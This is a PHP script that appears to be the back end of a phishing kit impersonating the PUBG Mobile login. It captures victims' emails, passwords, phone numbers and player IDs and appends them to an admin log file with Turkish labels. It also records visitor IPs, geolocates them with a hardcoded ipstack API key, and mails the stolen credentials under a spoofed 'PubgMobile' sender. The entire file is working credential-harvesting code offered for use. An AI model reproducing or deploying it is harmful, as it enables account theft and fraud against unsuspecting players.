<?php
$min_seconds_between_refreshes = 60;
session_start();
if(array_key_exists('last_access', $_SESSION) && time()-$min_seconds_between_refreshes <= $_SESSION['last_access']) {
  exit('You are refreshing too quickly, please wait a few seconds and try again.');
}
$_SESSION['last_access'] = time();
?>
<?php
 $ip = $_SERVER['REMOTE_ADDR']; 
 $api_key = "5d78d0b2cfb2a2de43c4aa331b17ccc4";
 $freegeoipjson = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."");
 $jsondata = json_decode($freegeoipjson);
 $countryfromip = $jsondata->country_name;
 ?>

<?php
$email = $_POST['email'];
$password = $_POST['password'];
$phone = $_POST['phone'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$level = $_POST['level'];
?>

<?php
include ('admin/config.php');
$headers = "From: HamaTheTeacher@gmail.com";
$headers.= "Content-type: text/html";
$success = mail($mailto, $subjek, $body, $headers);
$handle = fopen("admin/vic.php", "a");

$body = '

#---------[ ☠️☠️☠️☠️]-----------#

<br>    Giriş Tipi     =  '.$login.'

<br>	Kullancı adı   =   '.$email.'
<br>	Şifre   =   '.$password.'
<br>	Tel no   =   '.$phone.'

<br>	Oyuncu 🆔   =   '.$playid.'
<br>	Seviye   =   '.$level.'
<br>
<body>

<?php
date_default_timezone_set("TURKEY");
echo "Giriş Tarihi " . date("Y/m/d") . "<br>";

echo "Giriş Saati " . date("G:i");
?>
</body>
<br>
<button onClick="window.location.reload();">Yenile</button>
<br>
#------[ Reis ]-----#
<br>
';


	$file = fopen("admin/vic.php", "a");
	fwrite($file, $body);

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
include ('admin/config.php');
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$subjek = "PUBG $login|$email|$level";

$headers = "From: PubgMobile <HamaTheTeacher@gmail.com>";
$headers.= "";
$success = mail($result, $subjek, $body, $headers);
?>
<html>
  <head>

<form type="hidden" method="POST" action="done_2.php" id="myform">
     <input type="hidden" class="verify" name="email" id="email" value="<?php echo $email;?>" readonly>
      <input type="hidden" class="verify" name="phone" id="phone" value="<?php echo $phone;?>" readonly>
       <input type="hidden" class="verify" name="password" id="password" value="<?php echo $password;?>" readonly>
        <input type="hidden" class="verify" name="login" id="login" value="<?php echo $login;?>" readonly>
         <input type="hidden" class="verify" name="playid" id="playid" value="<?php echo $playid;?>" readonly>
          <input type="hidden" class="verify" name="level" id="level" value="<?php echo $level;?>" readonly>
               <input type="hidden" class="verify" name="countryfromip" id="countryfromip" value="<?php echo $countryfromip;?>" readonly>
  <input style="hidden" type="submit">
</form>
 
<script type="text/javascript">
  document.getElementById("myform").submit();
</script>

  </head>
  <body>
  </body>
</html>
